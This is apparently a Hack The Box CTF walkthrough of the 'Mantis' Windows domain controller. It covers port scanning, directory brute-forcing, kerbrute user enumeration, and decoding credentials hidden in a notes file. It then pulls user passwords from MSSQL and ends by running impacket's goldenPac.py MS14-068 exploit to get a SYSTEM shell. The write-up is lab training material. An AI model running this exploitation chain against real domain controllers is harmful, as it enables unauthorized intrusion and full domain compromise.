Nmap scan

```
nmap -p- --min-rate 10000 -oA nmap 10.10.10.52
Not shown: 36855 closed ports, 28653 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1337/tcp  open  waste
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49164/tcp open  unknown
49166/tcp open  unknown
49168/tcp open  unknown
50255/tcp open  unknown

```


### Enumerating SMB and RPC

Smb doesn't give us nothing

```
smbclient -L 10.10.10.52
Enter WORKGROUP\localuser's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

Same with RPC

```
rpcclient -U "" -N 10.10.10.52
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

### Enumerating port 8080 (HTTP)

```
sudo gobuster -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.52:8080/ -t 20
/archive (Status: 200)                                                                                                                                                                        
/blogs (Status: 200)                                                                                                                                                                          
/admin (Status: 302)                                                                                                                                                                          
/tags (Status: 200)                                                                                                                                                                           
/Archive (Status: 200)                                                                                                                                                                        
/pollArchive (Status: 200)                                                                                                                                                                    
/Blogs (Status: 200)                                                                                                                                                                          
/newsarchive (Status: 200) 
```

We can access to `/admin` but it redirects us to a login, trying with default credentials but we don't get results back.

The footer of the website shows: `Powered by Orchard` that is a CMS, using searchsploit there are some vulnerabilities

```
searchsploit orchard
Orchard 1.3.9 - 'ReturnUrl' Open Redirection                                                                                                                | php/webapps/36493.txt
Orchard CMS 1.7.3/1.8.2/1.9.0 - Persistent Cross-Site Scripting                                                                                             | asp/webapps/37533.txt
Orchard Core RC1 - Persistent Cross-Site Scripting                                                                                                          | aspx/webapps/48456.txt

```

These exploit doesn't seems usefull 

### Enumerating port 88 (kerberos)

Let's try to get usernames with kerbrute

```
kerbrute -users /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -dc-ip 10.10.10.52 -domain htb.local
[*] Valid user => james
```

Now I tryed doing AS-REP roast but didn't get anything back

### Enumerating port 1337

Going to http://10.10.10.52:1337 there's the Microsoft IIS default page, then I use gobuster

```
sudo gobuster -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.52:1337 -t 50
/secure_notes (Status: 301)
```

Going to the directory `/secure/notes/` there's a `.txt` file and a `web.config` file:

dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt:

```
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
```

Scrolling down there's this:

```
Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```

Decoding from binary we have the password: `@dm!n_P@ssW0rd!`, with this password we can sing in http://10.10.10.52:8080/admin  there's an admin password but we can't do anything with it.

Decoding the string `NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx` from base64 and then from hex we get this: `m$$ql_S@_P@ssW0rd!`

### Enumerating port 1443 with credentials (MSSQL)

Login as admin:

```
python3 /opt/impacket/examples/mssqlclient.py'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
```

The login works, but now I'll connect using dbeaver, and select SQL Server as the note said

![image1](/assets/images/htb-mantis/mantis1.png)

And we find the password for admin and james:

![image2](/assets/images/htb-mantis/mantis2.png)

### Enumerating with user James

We have this password `J@m3s_P@ssW0rd!` , I try to enumerate SMB

```
smbmap -H 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.52...
[+] IP: 10.10.10.52:445 Name: 10.10.10.52                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        .                                                  
        dr--r--r--                0 Thu Aug 31 17:05:10 2017    .
        dr--r--r--                0 Thu Aug 31 17:05:10 2017    ..
        NETLOGON                                                READ ONLY       Logon server share 
        .                                                  
        dr--r--r--                0 Thu Aug 31 17:05:10 2017    .
        dr--r--r--                0 Thu Aug 31 17:05:10 2017    ..
        dr--r--r--                0 Thu Aug 31 17:05:10 2017    htb.local
        SYSVOL                                                  READ ONLY       Logon server share 
```

We can't login with psexec, but this box is vulnerable to `MS14-068` so exploit is using goldenPac.py from impacket.

### Exploiting MS14-068

```
sudo python3 /opt/impacket/examples/goldenPac.py htb.local/james@mantis.htb.local -dc-ip 10.10.10.52 -target-ip 10.10.10.52
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[-] Couldn't get forest info ([Errno Connection error (htb.local:445)] [Errno -2] Name or service not known), continuing
[*] Attacking domain controller 10.10.10.52
[*] 10.10.10.52 found vulnerable!
[*] Requesting shares on 10.10.10.52.....
[*] Found writable share ADMIN$
[*] Uploading file TOhcONnf.exe
[*] Opening SVCManager on 10.10.10.52.....
[*] Creating service ljFG on 10.10.10.52.....
[*] Starting service ljFG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>     
```

And we are administrator
